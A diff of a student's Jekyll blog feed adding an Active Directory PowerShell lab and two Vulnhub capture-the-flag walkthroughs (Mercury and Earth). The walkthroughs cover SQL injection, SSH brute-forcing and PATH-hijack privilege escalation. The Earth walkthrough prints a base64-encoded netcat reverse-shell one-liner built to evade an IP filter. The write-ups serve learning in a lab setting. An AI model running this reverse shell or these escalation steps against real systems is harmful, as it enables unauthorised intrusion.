@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-01-08T18:00:20-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Cyber Turtle</title><subtitle>A cybersecurity student writing about cybersecurity things</subtitle><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/jekyll/update/2025/01/08/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2025-01-08T17:53:33-05:00</published><updated>2025-01-08T17:53:33-05:00</updated><id>http://localhost:4000/jekyll/update/2025/01/08/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2025/01/08/welcome-to-jekyll.html"><![CDATA[<p>You’ll find this post in your <code class="language-plaintext highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="language-plaintext highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-01-09T09:14:39-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Cyber Turtle</title><subtitle>A cybersecurity student writing about cybersecurity things</subtitle><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/jekyll/update/2025/01/08/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2025-01-08T17:53:33-05:00</published><updated>2025-01-08T17:53:33-05:00</updated><id>http://localhost:4000/jekyll/update/2025/01/08/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2025/01/08/welcome-to-jekyll.html"><![CDATA[<p>You’ll find this post in your <code class="language-plaintext highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="language-plaintext highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>
 
 <p>Jekyll requires blog post files to be named according to the following format:</p>
 
@@ -14,4 +14,203 @@
 <span class="n">print_hi</span><span class="p">(</span><span class="s1">'Tom'</span><span class="p">)</span>
 <span class="c1">#=&gt; prints 'Hi, Tom' to STDOUT.</span></code></pre></figure>
 
-<p>Check out the <a href="https://jekyllrb.com/docs/home">Jekyll docs</a> for more info on how to get the most out of Jekyll. File all bugs/feature requests at <a href="https://github.com/jekyll/jekyll">Jekyll’s GitHub repo</a>. If you have questions, you can ask them on <a href="https://talk.jekyllrb.com/">Jekyll Talk</a>.</p>]]></content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.]]></summary></entry></feed>
+<p>Check out the <a href="https://jekyllrb.com/docs/home">Jekyll docs</a> for more info on how to get the most out of Jekyll. File all bugs/feature requests at <a href="https://github.com/jekyll/jekyll">Jekyll’s GitHub repo</a>. If you have questions, you can ask them on <a href="https://talk.jekyllrb.com/">Jekyll Talk</a>.</p>]]></content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.]]></summary></entry><entry><title type="html">Active Directory Help Desk Lab</title><link href="http://localhost:4000/post/active%20directory/2023/04/20/active_directory_helpdesk.html" rel="alternate" type="text/html" title="Active Directory Help Desk Lab" /><published>2023-04-20T06:00:00-04:00</published><updated>2023-04-20T06:00:00-04:00</updated><id>http://localhost:4000/post/active%20directory/2023/04/20/active_directory_helpdesk</id><content type="html" xml:base="http://localhost:4000/post/active%20directory/2023/04/20/active_directory_helpdesk.html"><![CDATA[<p>Active Directory Help Desk Lab: Using PowerShell
+In this blog post, I wanted to test my current knowledge of Active Directory and PowerShell in order to emulate a few real world scenarios. While the last few posts were all about installing and learning the basics, this post will be about implementing those basics in a real world scenario.</p>
+
+<p>Changing Password</p>
+
+<p>The first ‘lab’ or scenario that I want to do is a very simple password reset for a user. People forget their passwords all the time, they reuse passwords, they change passwords only slightly when they have to (think changing password to Password), they leave their passwords on a sticky note right next to their computer (or in a file on a desktop).</p>
+
+<p>One thing that people do often is forget their passwords and get locked out of their own accounts. So for this scenario, a user gets locked out of their account and needs their password reset. The goal is to just reset a user’s password.</p>
+
+<p>The first thing I need to do is get an unlucky user from my AD. I could just look at the list of users and grab somebody at random. However, to make it a little bit more interesting, and to keep experimenting with PowerShell, I want to use a script.</p>
+
+<p>A simple cmdlet saved as a .ps1 file. Get-ADUser -Filter * just gets all the AD users, and Get-Random picks out a random object. When I run it for the first time, it gives me this:</p>
+
+<p>Hildegarde Mortenson has been locked out of their account, and needs their password reset.</p>
+
+<p>Doing a little bit of research on resetting a user’s password, I found that you need to have a password that it is going to be reset to, and the user’s identity. I already have the identity, so now I just need to set the password.</p>
+
+<p>First, to set the password, you need to do something like this:</p>
+
+<p>In the screenshot, I’m essentially just setting a password variable, that way when I do the cmdlet to change passwords, I just call that variable.</p>
+
+<p>Next, I need to use this command to set the password for Hildegarde:</p>
+
+<p>The next part is optional, but in a real world scenario, this password would obviously need to be changed. So I used the below cmdlet to force Hildegarde to change the password at logon.</p>
+
+<p>In a previous lab, I think I set passwords to never expire, which is why I had to do the first command in the screenshot. So for Hildegarde, the password will expire, and she will need to change it at the next logon.</p>
+
+<p>To test out if this worked, I booted up the Client1 virtual machine to try to log in as hmortenson.</p>
+
+<p>Logging in, the new password worked, and it prompted the user to change the password. With a new password, Hildegarde can move on and do their work in peace, and hopefully she will remember the password.</p>
+
+<p>Creating a New User</p>
+
+<p>This challenge is going to be creating a new user using PowerShell. I’m sure there are countless scenarios where a new user needs to be added this way.</p>
+
+<p>Instead of going to my script to generate a random user, I went to fakenamegenerator.com to generate a new user.</p>
+
+<p>So I am creating the new user of William Shaeffer using cmdlets.</p>
+
+<p>To go over the cmdlet, New-ADUser is the cmdlet to create new users, with all the parameters. -Name is the account name, -GivenName is the first name, -SamAccountName is the login name, and Account Password is the user’s password. All is well and good, however the one problem is that in the original cmdlet I forgot to enable the user.</p>
+
+<p>The way to fix that is just to use the Enable-ADAccount cmdlet. Now this new employee is ready to get to work.</p>
+
+<p>Creating a Group and Adding Users</p>
+
+<p>For the next scenario, I’m going to be creating a group in AD. Higher management wants a whole group filled with every employee that has the letter ‘x’ in their name. They want the group to be called “The X Group”.</p>
+
+<p>This task has a few steps. The first step is to get all the users with ‘x’ in their names. The second step is to create a new group, and the third step is to add all those users into that group.</p>
+
+<p>So, as a disclaimer, I did try to do this all in one powershell script, but I kept on running into errors and couldn’t figure out how to do it that way.</p>
+
+<p>In order to get all the members, I did this cmdlet, which is just Get-ADUser with a few filters that are looking for the letter ‘x’ in the name. I then used Select-Object SamAccountName to get only their login names. I then put it all in a text document.</p>
+
+<p>After that, I created a .ps1 file that will create the group and add all the members to that group.</p>
+
+<p>The powershell script is essentially just going through each user in the text file and adding it to ‘The X Group’.</p>
+
+<p>I ran the script, and the group was created. When I checked the server manager, the group was there with all the members.</p>
+
+<p>Doing a couple of these tasks got me a little bit more comfortable with using PowerShell alongside Active Directory. The two of them are incredibly useful skills to have in any IT job, because so many organizations use AD. PS offers users many ways to play around with AD, ways that you can’t do in the server manager.</p>
+
+<p>I’m looking forward to exploring more and developing my understanding of Active Directory and PowerShell.</p>]]></content><author><name></name></author><category term="post" /><category term="active directory" /><category term="post" /><category term="active directory" /><summary type="html"><![CDATA[Active Directory Help Desk Lab: Using PowerShell In this blog post, I wanted to test my current knowledge of Active Directory and PowerShell in order to emulate a few real world scenarios. While the last few posts were all about installing and learning the basics, this post will be about implementing those basics in a real world scenario.]]></summary></entry><entry><title type="html">The Planets: Mercury Walkthrough</title><link href="http://localhost:4000/post/hacking/2023/04/17/vulnhub_mercury.html" rel="alternate" type="text/html" title="The Planets: Mercury Walkthrough" /><published>2023-04-17T06:00:00-04:00</published><updated>2023-04-17T06:00:00-04:00</updated><id>http://localhost:4000/post/hacking/2023/04/17/vulnhub_mercury</id><content type="html" xml:base="http://localhost:4000/post/hacking/2023/04/17/vulnhub_mercury.html"><![CDATA[<p>When I went on to Vulnhub to look for a vulnerable machine to test my hacking skills, I found one called The Planets: Earth. I immediately started with that one, not knowing it was the third in a series. For this post, I’m going to be going through the first one, Mercury. I would eventually like to get to Venus at some point as well.</p>
+
+<p>There are two flags I needed to look for, a user flag and a root flag. The first thing I did was make a directory on the Kali machine that is going to hold all the enumeration/reconnaissance information. I didn’t want to have to run multiple nmap scans every time I wanted to check something, so I was going to make a habit of putting it all into files.</p>
+
+<p>After setting up the machines, I wanted to figure out the IP address for the vulnerable machine. I did it the same way I did it in the Earth walkthrough, with an nmap scan of the network. The -o option for nmap puts it into a text file.</p>
+
+<p>The IP address is 192.168.56.24, and there are two ports open: port 22 for SSH, and port 8080 for HTTP. After that, I wanted to check out the web application. Since it’s on port 8080, I would have to browse to 192.168.56.24:8080.</p>
+
+<p>Initially, there is nothing there. Checking the page source also didn’t give me anything fruitful, so I went back to the command line to do a few scans.</p>
+
+<p>I don’t know why all that information was in the nmap scan, as I had never seen that happen. But I got the service versions for SSH and http, and I got the operating system (linux 4.15–5.6).</p>
+
+<p>I then used dirb to try to enumerate directories on the service. Doing that returned one directory, the robots.txt file. Going to that file didn’t really return anything useful.</p>
+
+<p>I did find, however, that trying directories that don’t exist gets a debug screen instead of the standard 404 error. Debugs are very useful for attackers, because they give information about how the service is operating. The more information it reveals, the better.</p>
+
+<p>This one gives a directory, /mercuryfacts.</p>
+
+<p>This page has two pages: the first one is a fact about Mercury, and the second is a todo list.</p>
+
+<p>The todo list is interesting, because of ‘direct mysql call’. A direct mysql call implies that there will be a page that is vulnerable to a SQL injection. Which is good, because I don’t know how to exploit django.</p>
+
+<p>Going on the Mercury Fact Page . If you look at the URL, http://192.168.56.24:8080/mercuryfacts/1/</p>
+
+<p>There is a number at the end of the URL. There are no other links to other facts, but if you change the number, you get the other facts.</p>
+
+<p>Playing around with it, if you put in a number larger than 8, it won’t return anything. Knowing that errors get a whole debug page, I started playing around with different inputs, and I got the below error message.</p>
+
+<p>So this is telling me that changing the number changes the SQL query. I want to exploit that even further. Through some googling, and finding this page, I figured out how I was going to word the SQL injection. I wanted to list the contents of the database, and since I know this is mysql, the way to do that would be through the way down below.</p>
+
+<p>To try to explain how this works, the original SQL query is “SELECT fact FROM facts where id = 1”. The SQL query in the above is listing the tables in the database. If you go to the link above, which is a SQL injection cheat sheet, that is just listing the tables in the database. The AND 1=1 in there was necessary, because leaving it out would give me the debug screen. It doesn’t have to be AND 1=1, it could be AND 1=2 or something like that, and it would work.</p>
+
+<p>Through that output, I can see that there is a table called users. The next part took a few tries, but I managed to get a list of users.</p>
+
+<p>Going even further, if I change the SQL query just a little bit further, I can get their passwords.</p>
+
+<p>So now I have a list of passwords and usernames. I put them both into separate text files, and planned on brute forcing the ssh login. I could technically guess which password belongs to which user, but I wanted to test out a few different tools. There are a couple of ways to do this, and I’m going to show both of them.</p>
+
+<p>The first way is through hydra, a password brute forcing tool. This tool can be used for many different services, but this one is for SSH. The screenshot above shows the password for the webmaster user. -L is for the list of usernames, -P is for the list of passwords, and the service (SSH) needs to be stated. The -t 4 is the number of tasks running. After I get the username, I use ssh to log in to the system.</p>
+
+<p>The second option is to use metasploit, where there is an ssh_login module that will allow you to essentially do the exact same thing.</p>
+
+<p>You need to set the RHOSTS (target IP), and there are also a few other options. I set PASS_FILE and USER_FILE to my password file and username file. And then you just type run, and the module runs and sets up a session.</p>
+
+<p>Regardless of which way I choose to login, I am now in the system as the webmaster user. I got the first flag.</p>
+
+<p>Now I need to get to root in order to get to the second flag.</p>
+
+<p>I tried sudo -l, but this user is not allowed to run sudo on the machine. I tried to open /etc/passwd and /etc/shadow, but this user didn’t have the permissions to do that. I then tried to find binaries where the permissions are set.</p>
+
+<p>This didn’t really give anything either, as webmaster isn’t allowed to run sudo.</p>
+
+<p>Then I went and looked around mercury_proj, the only directory in the webmaster’s home directory. While I was there, I found a notes.txt file. It had a reference to project accounts, and linuxmaster, another user. Next to the usernames, it had what looked like base64 encoding.</p>
+
+<p>And I was right. I switched over, and I was now linuxmaster instead of webmaster. This is horizontal privilege escalation, and is essentially switching over to another user instead of trying to get to root.</p>
+
+<p>And I found that I could run sudo -l to figure out what I could do as this user.</p>
+
+<p>So this is the one command that this user can run as sudo. It is literally just a binary that calls the tail command on the syslog file. Not really anything interesting about that by itself, but the interesting part of it is that it just calls the command without the full path.</p>
+
+<p>So when you execute a command in Linux, the system looks for the first executable with that name in the user’s path variable. It’s why when you type in a command, ‘pwd’ for instance, you don’t have to type in /usr/bin/pwd. That path is part of the user’s path variable, and so it looks for ‘pwd’ in that directory. You can set a custom path just by typing in ‘export PATH=[your path here]’. And you can see the path variable by using ‘echo $PATH’.</p>
+
+<p>Bash scripts calling on commands that don’t have the full path run the risk of attackers exploiting the PATH variable. If that bash script can be run as root, then it is a vulnerability for privilege escalation. An attacker can change the path to whatever they want, make a script with the same name as the command, and then run the original bash script as sudo. When the script runs, it’ll run the malicious script instead of the original.</p>
+
+<p>To explain what I did, I added my current directory to the path variable, created a file named tail that would switch over to root, changed it so that it was executable, and ran the command with sudo privileges. Sudo — -preserve-env=PATH basically says to use the current environmental factors, which I had changed. The binary was run, with the ‘tail’ script that was actually to switch user to root.</p>
+
+<p>And after that, I went over to the root directory to get the flag.</p>]]></content><author><name></name></author><category term="post" /><category term="hacking" /><category term="post" /><category term="hacking" /><summary type="html"><![CDATA[When I went on to Vulnhub to look for a vulnerable machine to test my hacking skills, I found one called The Planets: Earth. I immediately started with that one, not knowing it was the third in a series. For this post, I’m going to be going through the first one, Mercury. I would eventually like to get to Venus at some point as well.]]></summary></entry><entry><title type="html">Vulnhub Earth Walkthrough</title><link href="http://localhost:4000/post/hacking/2023/04/10/vulnub_earth.html" rel="alternate" type="text/html" title="Vulnhub Earth Walkthrough" /><published>2023-04-10T06:00:00-04:00</published><updated>2023-04-10T06:00:00-04:00</updated><id>http://localhost:4000/post/hacking/2023/04/10/vulnub_earth</id><content type="html" xml:base="http://localhost:4000/post/hacking/2023/04/10/vulnub_earth.html"><![CDATA[<p>This blog post will be focused on a walkthrough on hacking Vulnhub’s The Planets: Earth machine. There are two flags to be found according to the description: “a user and root flag which include an md5 hash”. The tools covered here will be nmap, dirb, and CyberChef.</p>
+
+<p>The first thing I did on my Kali Linux machine was to see if the vulnerable machine was up and running, and to find out the machine’s IP address.</p>
+
+<p>My Kali Linux machine is 192.168.56.22, so Earth’s address must be 192.168.56.23. And according to the nmap scan, the ports open up are ports 22 (SSH), 80 (HTTP), and 443 (HTTPS). Those two ports open up means there must be a web application. Before doing anything else, I opened up my browser in order to see what the web application looks like, and see if I can find anything I can use.</p>
+
+<p>If you use http to view the web app, you will see a 400 error. However, if you use https, you will see a default web page. If you take a look at the certificate, you will see the DNS name for the web server.</p>
+
+<p>HTTP</p>
+
+<p>HTTPS
+In order to continue with reconnaissance, I used a few tools. The first was a specific nmap scan of the machine.</p>
+
+<p>Breaking down the nmap command, -p 22,80,443 just means I’m scanning those ports. I figured since this was an ‘easy’ machine, I really wouldn’t need to scan for more. -O is for the operating system, which you need sudo (root or administrator on Linux) privileges for, and the -sV flag is getting the service versions for those services running. I’m basically just looking for potential vulnerabilities. If outdated versions of services are running, for example, then I can use that to get into the system.</p>
+
+<p>As a side note, when you’re doing this, you should direct the output to a file. I forgot to do that, and when I wanted to get the information again, I had to run a second nmap scan. It’s not a big deal in this scenario, but in an actual penetration test, that is probably a big mistake.</p>
+
+<p>To do a little bit more web enumeration, I used the dirb command, a command line web enumeration tool, in order to find out what directories on the service are running. If you don’t specify the wordlist, it will default to common.txt. That was what I wanted, so I didn’t use any other wordlist for this particular stage. And again, I would definitely append this to a file so you can reference it later.</p>
+
+<p>The results of the dirb scan said there was one directory, the cgi-bin directory, and that returns a 403 error.</p>
+
+<p>Up until this point I was using the ip address for nmap and dirb. And while doing that, I couldn’t figure anything out. The versions of http and https didn’t have vulnerabilities that I was going to be able to exploit. It looked like I had hit a dead end. I looked at the certificate again, and I edited my /etc/hosts file to map the hostname to the ip address. After I did that, this web enumeration became a lot easier. You can just use any text editor of choice to map the ip address to ‘earth.local’ and ‘terratest.earth.local’.</p>
+
+<p>From the screenshot, there is a user input field that allows me to send a message to Earth. There are previous messages that also look encrypted.</p>
+
+<p>Doing another dirb scan of both earth.local and terratest.earth.local, there is a new directory, called admin. When I visit there, there is a login field. This is a good discovery, but I don’t really have any useful information. I don’t have usernames and I don’t have passwords.</p>
+
+<p>Also, up until this point, I was using http for the dirb scan. Switching up to https, however, gave me much more detail.</p>
+
+<p>It specifically gave me a robots.txt file. That file essentially just tells web crawlers what pages they can and can’t visit. Visiting the robots.txt page, one disallowed directory caught my eye. Visiting that page got me a username, and it also got me the encryption method (XOR).</p>
+
+<p>And then going to the other page mentioned, testdata.txt, got me this message.</p>
+
+<p>That message, mentioned in the previous page, is the key used. When it comes to encryption, if the key is compromised, then a new key needs to be used asap. You definitely do not want any attackers finding your encryption key. Anything encrypted can be decrypted using the key.</p>
+
+<p>Trying to decode the first two messages on the web page is useless, they’re just nonsensical messages. The third one is the most important one. To decode it, I went to CyberChef.</p>
+
+<p>This part took a lot of googling on my part, but I found that converting the message From Hex, and then using XOR with the testdata.txt as the key managed to decrypt the message.</p>
+
+<p>That looks like it could be something good, like a password. I have a username ‘terra’. Going back to the login page, I tried that as the password, and I was in the system.</p>
+
+<p>And I could run commands. The first thing I wanted to do was set up a netcat listener. I ran ‘which nc’ to make sure the ‘nc’ command was on the machine. It was on the machine, so I could theoretically run it.</p>
+
+<p>However, when I tried to run it, I ran into that message. I would have to figure out another way of getting into the system. That however, took a while, so before that I decided to run “locate ‘flag’” to see if I could find the first flag just on this CLI interface.</p>
+
+<p>With the first flag found, I needed to figure out how I could spawn that shell on the system. The easiest solution would be to see if I could view the /etc/passwd and /etc/shadow file. If I could, then I could just brute force passwords. However, while the /etc/passwd was viewable, /etc/shadow was not.</p>
+
+<p>Experimenting with it a bit further, and with a bit more googling and playing around with it, I found that the remote connections are being detected by IP address in the command.</p>
+
+<p>In the screenshot, even though the command ‘echo’ is not going to set up a remote connection, it is still blocked because of the IP address. As a side note, if you type in an invalid IP address (if any of the numbers are over 255), then it’ll go through. So it’s not only testing the format, it’s also testing if it is a valid IP address.</p>
+
+<p>So using that knowledge to set up a listener, I did the following steps. There are probably easier ways to do this, but this is how I did it.</p>
+
+<p>Encode the command that I’m going to run on the web CLI. This command is going to set up the listener. Encoding it will ensure that the command will slip through whatever is detecting the IP address. You can probably use any command line encryption method, but I used base64.</p>
+
+<p>Set up a netcat listener on your port of choice.</p>
+
+<p>On the victim web application, echo the encoded command, pipe the output to be decoded, and then run ‘bash -’ to ensure that the stdin is run as a command. It should look something like this:
+echo “bmMgMTkyLjE2OC41Ni4yMiA0NDQ0IC1lIC9iaW4vYmFzaAo=” | base64 -d | bash -</p>
+
+<p>After doing all that, I have a listener on the machine! And to make sure I had some more interface control, I spawned an interactive shell.</p>
+
+<p>And now, I had to figure out how to pivot from here. I am currently an apache user, and I need to figure out how to get to root. The first thing I did was run ‘sudo -l’ to figure out what I can run as a sudo user. However, even that required a password, so I figured that wasn’t going to be fruitful.</p>
+
+<p>Running the above command finds all binaries where they run as the owner of the file, not as the user who called it. There is a binary called ‘reset_root’. If you try to run that, it fails and says that “all triggers not present”. I figured I needed to find out what those triggers are. Using the strings command, I wanted to see exactly what this binary does. I found that if the binary runs successfully, root’s password will be changed to ‘Earth’. To figure out what exactly the triggers needed to be, I transferred the binary over to my Kali Linux machine. To do that, I just set up a ncat listener on my Kali machine to send any output to a file, and then sent it over on the shell I had on the victim machine.</p>
+
+<p>Then after that, I changed the permissions on the reset_root binary so that it is executable, and then used the ltrace command on it. Ltrace is essentially a command that runs another binary and sees what libraries are called. This is a great way to see what the ‘triggers’ the binary needs.</p>
+
+<p>And I saw what the triggers were for the binary to run successfully. I switched back over to the reverse shell, and I created those files. Then after running the binary, root password was switched to Earth.</p>
+
+<p>And then after that getting the root flag was straightforward. I switched over to root, went to the root directory, and the flag was there.</p>
+
+<p>This was a fun machine, and it is apparently the third in a series (Earth being the third planet from the sun). I think the main thing I learned from this was to basically not overlook anything. There were a few times during this where I was lost because of something I overlooked.</p>]]></content><author><name></name></author><category term="post" /><category term="hacking" /><category term="post" /><category term="hacking" /><summary type="html"><![CDATA[This blog post will be focused on a walkthrough on hacking Vulnhub’s The Planets: Earth machine. There are two flags to be found according to the description: “a user and root flag which include an md5 hash”. The tools covered here will be nmap, dirb, and CyberChef.]]></summary></entry></feed>
